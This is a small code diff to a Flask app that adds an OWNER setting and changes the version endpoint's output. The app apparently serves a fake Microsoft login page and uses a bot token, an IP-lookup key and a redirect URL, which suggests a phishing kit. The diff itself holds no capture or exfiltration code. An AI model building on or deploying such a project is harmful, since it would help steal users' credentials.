@@ -19,6 +19,7 @@ BOT_TOKEN = os.getenv("BOT_TOKEN")
 IP_API_KEY = os.getenv("IP_API_KEY")
 REDIRECT_URL = os.getenv("REDIRECT_URL")
 STRICT_MODE = os.getenv("STRICT_MODE")
+OWNER = os.getenv("OWNER")
 
 # --- Flask App Initialization ---
 app = Flask(__name__, static_folder='microsoft_login/build')
@@ -64,7 +65,7 @@ def bot_info():
 
 @app.get("/version")
 def version():
-    return {"status":"success", "version":"gsheet version"}
+    return {"status":"success", "version":"version 3.0", "owner": OWNER}
 
 
 
